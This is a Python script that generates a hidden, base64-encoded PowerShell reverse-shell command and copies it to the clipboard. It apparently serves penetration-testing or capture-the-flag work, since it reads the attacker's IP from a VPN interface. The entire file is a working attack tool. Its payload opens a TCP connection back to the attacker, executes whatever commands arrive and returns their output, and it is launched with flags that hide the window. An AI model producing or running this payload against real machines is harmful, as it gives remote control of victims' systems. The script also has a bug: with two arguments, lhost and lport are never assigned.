import sys
import base64
import subprocess

def get_local_ip():
    output = subprocess.run("ifconfig tun0 | grep 'inet ' | awk '{print $2}'", shell=True, capture_output=True).stdout.decode().strip()

    if len(output) == 0:
        print("could not retrieve IP from tun0... trying eth0")
        output = subprocess.run("ifconfig eth0 | grep 'inet ' | awk '{print $2}'", shell=True, capture_output=True).stdout.decode().strip()

        if len(output) == 0:
            print("Could not get local IP, please manually specify with -s [IP] [PORT]")
            exit()

    return output



if len(sys.argv) == 3:
    print(f"lhost = {sys.argv[1]}")
    print(f"lport = {sys.argv[2]}\n")

elif len(sys.argv) != 3:
    print("automatically assigning IP")
    lhost = get_local_ip()
    if len(sys.argv) == 2:
        lport = sys.argv[1]
    else:
        lport = 443
    print(f"\nUsing Local IP: {lhost}")
    print(f"Using Port: {lport}")

else:
    print("something fucked up")
    exit()

print(f"Encoding shell with lhost={lhost} lport={lport}\n")
payload = '$client = New-Object System.Net.Sockets.TCPClient("'+str(lhost)+'",'+str(lport)+');$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + "PS " + (pwd).Path + "> ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()'
cmd = "powershell -nop -w hidden -e " + base64.b64encode(payload.encode('utf16')[2:]).decode()

print(cmd)
out = subprocess.Popen(f"echo -n {cmd} | xclip -selection c", shell=True)
print("\ncopyied to clipboard :)")